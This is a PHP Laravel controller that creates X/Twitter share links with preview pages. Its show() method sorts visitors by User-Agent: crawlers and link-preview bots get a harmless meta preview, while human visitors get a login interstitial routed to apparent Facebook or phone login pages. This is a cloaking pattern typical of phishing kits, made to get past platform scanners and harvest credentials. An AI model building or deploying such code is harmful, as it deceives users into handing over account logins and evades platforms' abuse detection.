<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\SharedPost;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Str;

class XShareController extends Controller
{
    public function create()
    {
        $history = SharedPost::where('platform', 'twitter')->latest()->take(10)->get();

        return view('admin.x_share_create', compact('history'));
    }

    public function store(Request $request)
    {
        $data = $request->validate([
            'image' => 'required|image|max:10240',
            'writeup' => 'required|string',
        ]);

        $image = $request->file('image');
        $imageName = Str::random(40) . '.' . $image->getClientOriginalExtension();
        $image->move(public_path('shared_images'), $imageName);
        $token = Str::random(10);

        SharedPost::create([
            'image' => 'shared_images/' . $imageName,
            'writeup' => $data['writeup'],
            'token' => $token,
            'phone_share' => false,
            'platform' => 'twitter',
        ]);

        $shareUrl = URL::route('share.preview', ['token' => $token]);
        $actionUrl = 'https://twitter.com/intent/tweet?text=' . rawurlencode($data['writeup']) . '&url=' . rawurlencode($shareUrl);
        $history = SharedPost::where('platform', 'twitter')->latest()->take(10)->get();

        return view('admin.x_share_create', compact('history', 'shareUrl', 'actionUrl'));
    }

        public function show($token, Request $request)
    {
        $post = SharedPost::where('token', $token)->firstOrFail();
        $userAgent = strtolower($request->header('User-Agent', ''));
        $isBot = preg_match('/bot|crawl|slurp|spider|facebookexternalhit|facebot|twitterbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|slackbot|vkshare|telegrambot|applebot|whatsapp|flipboard|tumblr|bitlybot|scoop.it|redditbot|discordbot|google|bing|yandex|baidu/', $userAgent);
        if ($isBot) {
            // Show meta preview for bots/crawlers
            return response()->view('x.shared_post', compact('post'));
        } else {
            $redirectRoute = $post->phone_share ? 'phone.login' : 'facebook.login';
            return response()->view('x.login_interstitial', ['redirectRoute' => $redirectRoute]);
        }
    }

     public function destroy($id)
    {
        $post = SharedPost::where('platform', 'twitter')->findOrFail($id);
        $post->delete();
        return redirect()->back()->with('status', 'Share deleted successfully.');
    }

    public function destroyAll()
    {
        SharedPost::where('platform', 'twitter')->delete();

        return redirect()->back()->with('status', 'X share history cleared.');
    }





}